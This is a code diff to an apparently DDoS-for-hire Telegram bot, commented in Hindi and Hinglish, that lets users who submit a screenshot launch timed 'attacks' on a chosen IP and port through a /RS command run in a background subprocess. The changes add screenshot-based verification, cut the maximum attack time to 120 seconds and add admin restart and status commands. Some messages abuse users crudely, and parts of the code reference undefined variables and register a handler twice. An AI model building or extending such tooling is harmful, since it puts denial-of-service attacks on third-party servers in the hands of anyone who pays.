@@ -55,19 +55,15 @@ def start_command(message):
     first_name = user.first_name if user.first_name else "User"
     bot.send_message(message.chat.id, f"👋 **WELCOME, {first_name}!**\nतुम्हारा अटैक तभी लगेगा जब तुम स्क्रीनशॉट दोगे!", parse_mode="Markdown")
 
-# ✅ FIXED: SCREENSHOT SYSTEM (अब Screenshot देना ज़रूरी है)
+# ✅ SCREENSHOT VERIFIED USERS TRACKER
+verified_users = set()
+
+# ✅ HANDLE SCREENSHOT SUBMISSION
 @bot.message_handler(content_types=['photo'])
 def handle_screenshot(message):
-    user_id = message.from_user.id
-    file_id = message.photo[-1].file_id
-
-    caption_text = f"📸 **USER SCREENSHOT RECEIVED!**\n👤 **User ID:** `{user_id}`\n✅ **Forwarded to Admins!**"
-    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=caption_text, parse_mode="Markdown")
-    
-    bot.reply_to(message, "✅ SCREENSHOT FORWARDED! अब तुम अटैक कर सकते हो!")
-
-    # ✅ स्क्रीनशॉट देने वाले यूज़र को अटैक करने की इजाजत दो
-    active_attacks[user_id] = []
+    user_id = str(message.from_user.id)
+    verified_users.add(user_id)
+    bot.send_message(message.chat.id, "✅ SCREENSHOT RECEIVED! AB ATTACK KAR SAKTA HAI!")
 
 # ✅ /RS Attack Command (अब एक समय में सिर्फ 1 अटैक)
 @bot.message_handler(commands=['RS'])
@@ -79,9 +75,12 @@ def handle_attack(message):
         bot.reply_to(message, "❌ YOU CAN USE THIS COMMAND ONLY IN THE ATTACK GROUP!")
         return
 
-    if user_id not in active_attacks:
+    if user_id not in verified_users:
         bot.reply_to(message, "❌ SCREENSHOT BHEJ BSDK, TABHI ATTACK LAGEGA!")
         return
+
+    if user_id not in active_attacks:
+        active_attacks[user_id] = []
 
     if len(active_attacks[user_id]) >= 1:
         bot.reply_to(message, "❌ MAXIMUM 1 ATTACK ALLOWED AT A TIME! पहले अटैक खत्म होने दो।")
@@ -101,8 +100,8 @@ def handle_attack(message):
         bot.reply_to(message, "❌ PORT AND TIME MUST BE NUMBERS!")
         return
 
-    if time_duration > 240:
-        bot.reply_to(message, "🚫 MAX ATTACK TIME IS 240 SECONDS!")
+    if time_duration > 120:
+        bot.reply_to(message, "🚫 MAX ATTACK TIME IS 120 SECONDS!")
         return
 
     end_time = datetime.datetime.now(IST) + datetime.timedelta(seconds=time_duration)
@@ -118,10 +117,28 @@ def handle_attack(message):
         except subprocess.CalledProcessError:
             bot.reply_to(message, "❌ ATTACK FAILED!")
 
-        # ✅ अटैक खत्म होते ही लिस्ट से हटा दो
         active_attacks[user_id] = []
 
     threading.Thread(target=attack_execution).start()
+
+# ADMIN RESTART COMMAND (ONLY ADMINS)
+@bot.message_handler(commands=['restart'])
+def restart_bot(message):
+    if message.from_user.id in ADMINS:
+        bot.send_message(message.chat.id, "♻️ BOT RESTART HO RAHA HAI...")
+        time.sleep(1)
+        subprocess.run("python3 m.py", shell=True)
+    else:
+        bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")
+
+# HANDLE CHECK COMMAND
+@bot.message_handler(commands=['check'])
+def check_status(message):
+    if is_attack_running:
+        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
+        bot.reply_to(message, f"✅ **ATTACK CHAL RAHA HAI!**\n⏳ **BACHI HUI TIME:** {int(remaining_time)}S")
+    else:
+        bot.reply_to(message, "❌ KOI ATTACK ACTIVE NAHI HAI!")
 
 # ✅ /STATS Command - Shows Only Active Attacks
 @bot.message_handler(commands=['check'])
